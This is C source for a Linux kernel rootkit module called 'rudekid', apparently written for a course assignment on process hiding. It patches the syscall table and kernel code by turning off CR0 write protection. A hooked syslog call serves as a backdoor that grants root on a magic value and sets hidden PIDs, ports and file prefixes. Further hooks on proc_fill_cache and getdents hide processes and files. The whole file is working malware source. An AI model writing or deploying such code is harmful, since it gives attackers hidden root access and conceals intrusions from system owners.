/*
 *  Assignment 3
 *  Process Hiding
 *
 *  Requirements:
 *     a) Hide processes from the user in such a way that they are still scheduled.
 *     b) Tasks to hide should be identified by an array of PIDs passed to the
 *         module on the command line when loading the module
 */

#include <linux/module.h>
#include <linux/kobject.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/reboot.h>
#include <linux/moduleparam.h>
#include <linux/fs.h>
#include <linux/async.h>
#include <linux/pid_namespace.h>
#include <linux/ptrace.h>

#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

#include <asm/paravirt.h>
#include <asm/cacheflush.h>

#include "sysmap.h"
#include "proc_internal.h"
#include "ccc.h"

int hidden_pids[SZ_PIDS];
int hidden_tcp[SZ_PORTS];
int hidden_udp[SZ_PORTS];
char hidden_files[SZ_PREFIX];

void disable_ro(void)
{
    write_cr0(read_cr0() & ~X86_CR0_WP);
    barrier();
}

void enable_ro(void)
{
    write_cr0(read_cr0() | X86_CR0_WP);
    barrier();
}

#define FFF(x) ((typeof(& x )) SM_##x )

#define syscalls ((void**)SM_sys_call_table)
int (*asmlinkage old_syslog_func)(int type, char __user* buf, int len);
asmlinkage int fake_syslog(int type, char __user* buf, int len)
{
    struct cred* new;
    kuid_t kuid;

    CCC ccc;
    if ((type == 0xabad1dea) && (len == 1337))
    {
        if (copy_from_user(&ccc, buf, sizeof(ccc)) == 0)
        {
	    switch (ccc.cmd)
	    {
	    case GibeRoot:
		new = prepare_creds();
		new->suid = new->uid = kuid = make_kuid(current_user_ns(), 0);
		FFF(free_uid)(new->user);
		new->user = FFF(alloc_uid)(kuid);
		new->fsuid = new->euid = kuid;
		commit_creds(new);
		break;
	    case SetHiddenPids:
		memcpy(hidden_pids, ccc.payload.hidden_pids, sizeof(hidden_pids));
		break;
	    case SetHiddenTCP:
		memcpy(hidden_tcp, ccc.payload.hidden_ports, sizeof(hidden_tcp));
		break;
	    case SetHiddenUDP:
		memcpy(hidden_udp, ccc.payload.hidden_ports, sizeof(hidden_udp));
		break;
	    case SetFileHidingPrefix:
		memcpy(hidden_files, ccc.payload.file_hiding_prefix, sizeof(hidden_files));
		break;
	    // TODO: gtfo
	    default:
		return -42;
	    }
	    
            return 42;
        }
    }

    return old_syslog_func(type, buf, len);
}

void hook_syslog(void)
{
    disable_ro();
    old_syslog_func = syscalls[__NR_syslog];
    syscalls[__NR_syslog] = fake_syslog;
    enable_ro();
}

void unhook_syslog(void)
{
    disable_ro();
    syscalls[__NR_syslog] = old_syslog_func;
    enable_ro();
}

atomic_t active_hook_calls = ATOMIC_INIT(0);

// FIXME: fdhide
bool fake__proc_fill_cache( struct file *file,
                            struct dir_context *ctx,
                            const char *name,
                            int len,
                            instantiate_t instantiate,
                            struct task_struct *task,
                            const void *ptr )
{
    unsigned i;
    struct dentry *child, *dir = file->f_path.dentry;
    struct qstr qname = QSTR_INIT(name, len);
    struct inode *inode;
    unsigned type;
    ino_t ino;
    bool ret;
    char textbuf[16];

    atomic_inc(&active_hook_calls);

    for (i = 0; i < (sizeof(hidden_pids) / sizeof(hidden_pids[0])); ++i)
    {
        snprintf(textbuf, sizeof(textbuf), "%d", hidden_pids[i]);
        if (strcmp(name, textbuf) == 0)
        {
            ret = true;
            goto gtfo;
        }
    }

    child = d_hash_and_lookup(dir, &qname);
    if (!child) {
        child = d_alloc(dir, &qname);
        if (!child)
            goto end_instantiate;
        if (instantiate(d_inode(dir), child, task, ptr) < 0) {
            dput(child);
            goto end_instantiate;
        }
    }
    inode = d_inode(child);
    ino = inode->i_ino;
    type = inode->i_mode >> 12;
    dput(child);
    ret = dir_emit(ctx, name, len, ino, type);
    goto gtfo;

end_instantiate:
    ret = dir_emit(ctx, name, len, 1, DT_UNKNOWN);

gtfo:
    atomic_dec(&active_hook_calls);
    return ret;
}

uint8_t func_backup[12];

void hook_prochide(void)
{
    uint8_t* p;

    disable_ro();
    p = (uint8_t*)SM_proc_fill_cache;
    memcpy(func_backup, p, sizeof(func_backup));
    p[0] = 0x48;
    p[1] = 0xb8;
    *(void**)(p + 2) = fake__proc_fill_cache;
    p[10] = 0xff;
    p[11] = 0xe0;
    enable_ro();
}

void unhook_prochide(void)
{
    disable_ro();
    memcpy(SM_proc_fill_cache, func_backup, sizeof(func_backup));
    enable_ro();
}

struct linux_dirent {
  unsigned long   d_ino;
  unsigned long   d_off;
  unsigned short  d_reclen;
  char            d_name[1];
};

/* file hiding */
asmlinkage int (*real_getdents)(unsigned int, struct linux_dirent*, unsigned int);
asmlinkage int (*real_getdents64)(unsigned int, struct linux_dirent64 *, unsigned int);

int shall_hide_file(char *file_name)
{
  char *file_name_tmp = file_name;
  const char *prefix_tmp = hidden_files;

  if (*prefix_tmp == '\0')
      return false;

  while (*prefix_tmp != '\0') {
    if (*file_name_tmp == '\0' || *file_name_tmp != *prefix_tmp) {
      return 0;
    }
    ++file_name_tmp;
    ++prefix_tmp;
  }
  return 1;
}

asmlinkage int fake_getdents64( unsigned int fd,
                                struct linux_dirent64 *dirp,
                                unsigned int count )
{
  int ret;
  struct linux_dirent64 *cur = dirp;
  int pos = 0;

  ret = real_getdents64 (fd, dirp, count);

  while (pos < ret) {

    if (shall_hide_file(cur->d_name)) {
      int err;
      int reclen = cur->d_reclen;
      char *next_rec = (char*)cur + reclen;
      uintptr_t len = (uintptr_t)dirp + ret - (uintptr_t)next_rec;
      char *remaining_dirents = kmalloc(len, GFP_KERNEL);

      // modify the memory storing the returned information
      err = copy_from_user(remaining_dirents, next_rec, len);
      if (err) {
        continue;
      }
      err = copy_to_user(cur, remaining_dirents, len);
      if (err) {
        continue;
      }
      kfree(remaining_dirents);
      // Adjust the return value;
      ret -= reclen;
      continue;
    }
    // Get the next dirent
    pos += cur->d_reclen;
    cur = (struct linux_dirent64*) ((char*)dirp + pos);
  }
  return ret;
}

asmlinkage int fake_getdents(  unsigned int fd,
                               struct linux_dirent*dirp,
                               unsigned int count )
{
  int ret;
  struct linux_dirent* cur = dirp;
  int pos = 0;

  ret = real_getdents(fd, dirp, count);
  while (pos < ret) {

    if (shall_hide_file(cur->d_name)) {
      int reclen = cur->d_reclen;
      char* next_rec = (char*)cur + reclen;
      uintptr_t len = (uintptr_t)dirp + ret - (uintptr_t)next_rec;
      memmove(cur, next_rec, len);
      ret -= reclen;
      continue;
    }
    pos += cur->d_reclen;
    cur = (struct linux_dirent*) ((char*)dirp + pos);
  }
  return ret;
}

void hook_filehide(void)
{
    disable_ro();

    real_getdents             = syscalls[__NR_getdents];
    real_getdents64           = syscalls[__NR_getdents64];
    syscalls[__NR_getdents]   = fake_getdents;
    syscalls[__NR_getdents64] = fake_getdents64;

    enable_ro();
}

void unhook_filehide(void)
{
    disable_ro();

    syscalls[__NR_getdents]   = real_getdents;
    syscalls[__NR_getdents64] = real_getdents64;

    enable_ro();
}


int init_module(void){
    printk(KERN_INFO "rudekid loaded.\n");
    hook_syslog();
    hook_prochide();
    hook_filehide();

    return 0;
}

void cleanup_module(void){
    printk(KERN_INFO "rudekid unloaded.\n");

    unhook_syslog();
    unhook_prochide();
    unhook_filehide();

    while (atomic_read(&active_hook_calls) != 0)
        msleep(100);
}

